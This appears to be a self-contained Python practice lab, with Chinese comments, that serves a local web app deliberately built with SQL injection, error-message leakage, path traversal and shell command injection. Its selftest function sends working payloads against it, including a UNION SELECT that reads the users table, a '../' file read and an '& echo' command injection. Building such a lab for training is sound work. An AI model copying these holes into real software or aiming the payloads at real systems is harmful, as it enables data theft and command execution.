"""注入类靶场（自建，含内置检测）—— 第 04 类练手

植入 5 类缺陷：
  S1 SQL 注入（字符串拼接，可布尔盲注/联合查询）
  S2 报错信息泄露（把数据库异常回显给用户，暴露 SQL 语句与路径）
  S3 联合查询取数（可通过 UNION 读出 users 表凭据）
  P1 路径穿越（文件读取接口未做归一化校验）
  C1 命令注入（把用户输入拼进 shell 命令）

用法:
  python injlab.py              # 启动 (127.0.0.1:8097)
  python injlab.py --selftest   # 自动跑 5 项检测并输出 inj_findings.json
"""
import hashlib
import http.server
import json
import os
import pathlib
import sqlite3
import subprocess
import sys
import threading
import urllib.parse

PORT = 8097
HERE = pathlib.Path(__file__).parent
BASE = HERE / "injlab_www"
SECRET = HERE / "injlab_secret.txt"      # 故意放在 BASE 之外，用于路径穿越验证
DB = sqlite3.connect(":memory:", check_same_thread=False)
DB.executescript("""
CREATE TABLE products(id INTEGER PRIMARY KEY, name TEXT, price INT);
CREATE TABLE users(id INTEGER PRIMARY KEY, name TEXT, pass_hash TEXT, role TEXT);
""")
DB.execute("INSERT INTO products VALUES(1,'手机',29900)")
DB.execute("INSERT INTO products VALUES(2,'耳机',999)")
DB.execute("INSERT INTO products VALUES(3,'充电器',199)")
for i, (n, r) in enumerate([("admin", "admin"), ("alice", "user"), ("bob", "user")], 1):
    DB.execute("INSERT INTO users VALUES(?,?,?,?)", (i, n, hashlib.md5(f"{n}123".encode()).hexdigest(), r))
DB.commit()


class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def _send(self, code, body, ctype="text/plain; charset=utf-8"):
        b = body.encode("utf-8", "replace") if isinstance(body, str) else body
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)

    def do_GET(self):
        u = urllib.parse.urlparse(self.path)
        q = urllib.parse.parse_qs(u.query)

        if u.path == "/product":
            pid = (q.get("id") or ["1"])[0]
            # S1/S2/S3: 字符串拼接 + 异常回显
            sql = f"SELECT id,name,price FROM products WHERE id = {pid}"
            try:
                rows = DB.execute(sql).fetchall()
            except Exception as e:                                  # noqa: BLE001  S2
                return self._send(500, f"Database error: {e}\nSQL: {sql}\nFile: {__file__}")
            if not rows:
                return self._send(404, "no product")
            return self._send(200, "\n".join(f"{r[0]}|{r[1]}|{r[2]}" for r in rows))

        if u.path == "/download":
            fn = (q.get("file") or ["readme.txt"])[0]
            # P1: 未归一化校验，直接拼接读取
            path = os.path.join(str(BASE), fn)
            try:
                with open(path, "rb") as f:
                    return self._send(200, f.read())
            except Exception as e:                                  # noqa: BLE001
                return self._send(404, f"cannot read {fn}: {e}")

        if u.path == "/ping":
            host = (q.get("host") or ["127.0.0.1"])[0]
            # C1: 拼接进 shell
            try:
                out = subprocess.run(f"ping -n 1 {host}", shell=True, capture_output=True,
                                     text=True, timeout=15).stdout
            except Exception as e:                                  # noqa: BLE001
                out = f"err {e}"
            return self._send(200, out)

        if u.path == "/":
            return self._send(200, "<a href=/product?id=1>product</a> <a href='/download?file=readme.txt'>download</a> <a href='/ping?host=127.0.0.1'>ping</a>")
        self._send(404, "not found")


def selftest():
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:  # noqa: BLE001
        pass
    BASE.mkdir(exist_ok=True)
    (BASE / "readme.txt").write_text("public readme", encoding="utf-8")
    SECRET.write_text("TOP-SECRET-OUTSIDE-WEBROOT-9527", encoding="utf-8")

    import http.server as hs
    import urllib.error
    import urllib.request
    srv = hs.ThreadingHTTPServer(("127.0.0.1", PORT), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()

    def get(path):
        try:
            with urllib.request.urlopen(f"http://127.0.0.1:{PORT}{path}", timeout=15) as r:  # noqa: S310
                return r.status, r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8", "replace")
        except Exception as e:  # noqa: BLE001
            return 0, str(e)

    found = []

    def add(i, name, cat, sev, ev):
        found.append({"id": i, "name": name, "category": cat, "severity": sev,
                      "evidence": ev, "target": f"http://127.0.0.1:{PORT}"})

    # 基线
    s0, b0 = get("/product?id=1")
    n0 = len([x for x in b0.splitlines() if x.strip()])
    # S1 布尔注入
    s1, b1 = get("/product?id=1%20OR%201=1")
    n1 = len([x for x in b1.splitlines() if x.strip()])
    if n1 > n0:
        add("S1", "SQL 注入（字符串拼接，可布尔绕过）", "注入", "严重",
            f"基线 id=1 返回 {n0} 行；id=1 OR 1=1 返回 {n1} 行 → 条件被注入改变结果集")
    # S2 报错回显
    s2, b2 = get("/product?id=1%27")
    if s2 >= 500 and ("SQL:" in b2 or "sqlite" in b2.lower() or "syntax" in b2.lower()):
        leak = b2.splitlines()[0][:80] if b2 else ""
        add("S2", "数据库报错信息回显（泄露 SQL 语句与文件路径）", "信息泄露", "中",
            f"提交 id=1' 触发 500，响应体直接回显异常与完整 SQL：{leak}")
    # S3 联合查询取数
    s3, b3 = get("/product?id=0%20UNION%20SELECT%201,name,2%20FROM%20users")
    if s3 == 200 and ("admin" in b3 or "alice" in b3):
        names = [l.split("|")[1] for l in b3.splitlines() if "|" in l]
        add("S3", "联合查询注入（UNION 读取 users 表，可取凭据）", "注入", "严重",
            f"UNION SELECT 直接读出用户表：{names} → 可进一步取 pass_hash 破解口令")
    # P1 路径穿越
    sp, bp = get("/download?file=../injlab_secret.txt")
    if sp == 200 and "TOP-SECRET" in bp:
        add("P1", "路径穿越（可读取 Web 根目录外文件）", "路径穿越", "高",
            "file=../injlab_secret.txt 成功读到 Web 根目录之外的密钥文件内容（TOP-SECRET-…）")
    # C1 命令注入
    sc, bc = get("/ping?host=127.0.0.1%20%26%20echo%20INJ_MARK_9527")
    if "INJ_MARK_9527" in bc:
        add("C1", "命令注入（用户输入拼接进 shell 执行）", "命令注入", "严重",
            "host=127.0.0.1 & echo INJ_MARK_9527 → 响应中出现我们注入的命令输出 INJ_MARK_9527")

    out = HERE / "inj_findings.json"
    out.write_text(json.dumps(found, ensure_ascii=False, indent=1), encoding="utf-8")
    print(f"\n=== 检查 5 项，命中 {len(found)} 项 ===")
    for f in found:
        print(f"  [命中] [{f['id']}] {f['name']} → {f['evidence'][:88]}")
    print(f"已存: {out}")
    return found


if __name__ == "__main__":
    if "--selftest" in sys.argv:
        selftest()
    else:
        BASE.mkdir(exist_ok=True)
        (BASE / "readme.txt").write_text("public readme", encoding="utf-8")
        SECRET.write_text("TOP-SECRET-OUTSIDE-WEBROOT-9527", encoding="utf-8")
        print(f"注入靶场 listening on 127.0.0.1:{PORT}")
        http.server.ThreadingHTTPServer(("127.0.0.1", PORT), H).serve_forever()
